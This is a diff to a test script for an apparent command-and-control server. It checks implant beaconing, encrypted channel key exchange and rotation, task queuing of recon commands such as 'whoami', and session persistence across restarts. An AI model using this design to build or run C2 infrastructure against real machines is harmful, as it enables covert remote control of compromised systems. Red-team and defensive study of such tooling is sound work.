@@ -162,8 +162,8 @@ def main():
     imp = FakeImplant(sid)
     cmd, tid, r = imp.beacon(force_plaintext=True)   # first beacon: bootstrap
     check("first beacon returns spk", bool(imp.srv_pub_b64))
-    check("server stored channel key", srv._sessions[sid].get("key") == imp.key)
-    check("run id recorded", srv._sessions[sid].get("run") == "a1b2c3d4")
+    check("server stored channel key", (srv._session(sid) or {}).get("key") == imp.key)
+    check("run id recorded", (srv._session(sid) or {}).get("run") == "a1b2c3d4")
     check("first beacon cmd (encrypted) = sleep", cmd == "sleep", repr(cmd))
 
     t1 = imp.push_task('whoami && echo "quoted arg" ünïcode')
@@ -177,7 +177,7 @@ def main():
           repr(got))
 
     print("── task lifecycle: ack, completion, no retry ──")
-    check("task state done", srv._tasks[sid][0]["state"] == "done")
+    check("task marked done (dedup bookkeeping kept)", srv._store.is_done_tid(sid, t1))
     cmd2, tid2, _ = imp.beacon()
     check("beacon after done = sleep", cmd2 == "sleep" and tid2 == "", repr((cmd2, tid2)))
     check("ack consumed", imp.pending_ack == "")
@@ -197,7 +197,9 @@ def main():
     check("no extra result stored", len(imp.results()["results"]) == 2)
     cmd4, tid4, _ = imp.beacon()
     check("task done → sleep", cmd4 == "sleep" and tid4 == "")
-    check("server task state done", all(t["state"] == "done" for t in srv._tasks[sid]))
+    check("server task queue drained",
+          srv._store.task_states(sid)["done"] == 0
+          and srv._store.session(sid)["pending_tasks"] == 0)
 
     print("── session view exposes protocol state ──")
     view = imp.tasks_view()
@@ -216,25 +218,28 @@ def main():
     r_ok = imp.result(tid5, "whoami output")
     check("legit result after replay attempt", r_ok.status_code == 200)
 
-    print("── server restart (keypair rotated, store wiped) ──")
+    print("── server restart: keypair rotates, sessions survive (SQLite store) ──")
+    # A real restart rotates the server's ECDH keypair AND empties in-process
+    # memory, so the channel keys go with it. The session row deliberately
+    # survives now — that is the durability change — and the implant re-keys
+    # against the new server point exactly as it does on first contact.
     srv._SRV_ECDH = ec.generate_private_key(ec.SECP256R1())
     srv._SRV_PUB_B64 = base64.b64encode(
         srv._SRV_ECDH.public_key().public_bytes(
             Encoding.X962, PublicFormat.UncompressedPoint)[1:]).decode()
-    srv._sessions.clear()
-    srv._tasks.clear()
-    srv._results.clear()
-    srv._done_tids.clear()
-    cmd6, tid6, _ = imp.beacon()            # implant still on old epoch
-    check("rehandshake response plaintext + new spk", cmd6 == "sleep")
+    srv._channel_keys.clear()
+    check("session survived the restart", srv._store.session(sid) is not None)
+    check("completed-task bookkeeping survived", srv._store.is_done_tid(sid, t2))
+    cmd6, tid6, _ = imp.beacon()            # implant still on the old epoch
+    check("rehandshake response plaintext + new spk", cmd6 == "sleep", repr(cmd6))
     check("implant adopted new server pub", imp.srv_pub_b64 == srv._SRV_PUB_B64)
     cmd7, tid7, _ = imp.beacon()
-    check("beacon after re-handshake encrypted OK", cmd7 == "sleep")
+    check("beacon after re-handshake encrypted OK", cmd7 == "sleep", repr(cmd7))
 
     imp.push_task("ver")
     cmd8, tid8, _ = imp.beacon()
     check("task served after re-handshake", cmd8 == "ver", repr(cmd8))
-    check("server stored rotated key", srv._sessions[sid].get("key") == imp.key)
+    check("server stored rotated key", (srv._session(sid) or {}).get("key") == imp.key)
 
     print("── blob helpers round trip ──")
     blob = srv._enc_blob(imp.key, {"x": 'a"b\\c\nü'})
